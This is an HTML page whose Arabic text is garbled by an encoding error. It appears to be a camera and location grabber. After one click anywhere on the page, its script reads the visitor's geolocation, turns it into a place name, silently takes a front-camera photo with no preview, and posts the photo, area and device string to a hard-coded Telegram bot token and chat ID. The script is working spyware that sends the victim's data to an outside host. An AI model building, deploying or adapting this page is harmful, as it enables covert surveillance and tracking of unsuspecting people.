<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>ุฌุงุฑู ุงููุนุงูุฌุฉ</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
  font-family: Arial;
  text-align: center;
  margin-top: 40px;
}
img {
  width: 220px;
  margin: 20px auto;
  display: block;
}
</style>
</head>
<body>

<h3>๐ธ ุณูุชู ุงูุชูุงุท ุตูุฑุฉ ูุงุญุฏุฉ ุจุนุฏ ุงูููุงููุฉ</h3>
<p>ูุณูุชู ุชุญุฏูุฏ ูููุนู (ุงุณู ุงูููุทูุฉ)</p>

<!-- ๐ฝ ุถุน ุฑุงุจุท ุงูุตูุฑุฉ ููุง -->
<img src="https://ugc.production.linktr.ee/33eeaee9-a676-4312-b3bc-768c4266ef01_IMG-2923.webp?io=true&size=avatar-v3_0" alt="ุตูุฑุฉ">

<canvas id="canvas" style="display:none;"></canvas>

<script>
/* ๐ง ุนุฏูู ููุง */
const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
const CHAT_ID  = "6251932709";

let done = false;

// ๐ ุฃูู ููุณ ูู ุงูุตูุญุฉ (ุถุฑูุฑู ููู ุงูุฃุฌูุฒุฉ)
document.body.addEventListener("click", start, { once: true });

async function start() {
  if (done) return;
  done = true;

  try {
    // ๐ ุงููููุน
    navigator.geolocation.getCurrentPosition(async pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      // ๐ ุชุญููู ุงูุฅุญุฏุงุซูุงุช ูุงุณู ููุทูุฉ
      const geoRes = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
      );
      const geoData = await geoRes.json();

      const area =
        geoData.address.city ||
        geoData.address.town ||
        geoData.address.village ||
        geoData.address.state ||
        "ุบูุฑ ูุนุฑูู";

      // ๐ธ ุงููุงููุฑุง (ุจุฏูู ูุนุงููุฉ)
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }, // ุฃูุงููุฉ โ ุชุนูู ุนูู ุฃุบูุจ ุงูุฃุฌูุฒุฉ
        audio: false
      });

      const video = document.createElement("video");
      video.setAttribute("playsinline", true); // ููู ููุขูููู
      video.srcObject = stream;
      await video.play();

      const canvas = document.getElementById("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;

      canvas.getContext("2d").drawImage(video, 0, 0);

      const imageBase64 = canvas.toDataURL("image/png");

      stream.getTracks().forEach(t => t.stop());

      const device = navigator.userAgent;

      const text = `
๐ธ ุตูุฑุฉ ุฌุฏูุฏุฉ
๐ ุงูููุทูุฉ: ${area}
๐ฑ ุงูุฌูุงุฒ: ${device}
      `;

      // ๐ฉ ุฅุฑุณุงู ุงููุต
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text
        })
      });

      // ๐ท ุฅุฑุณุงู ุงูุตูุฑุฉ
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          photo: imageBase64
        })
      });

    }, () => {
      alert("โ ุชู ุฑูุถ ุงููููุน");
    });

  } catch (e) {
    alert("โ ูุดู ุงูุชูุงุท ุงูุตูุฑุฉ");
  }
}
</script>

</body>
</html>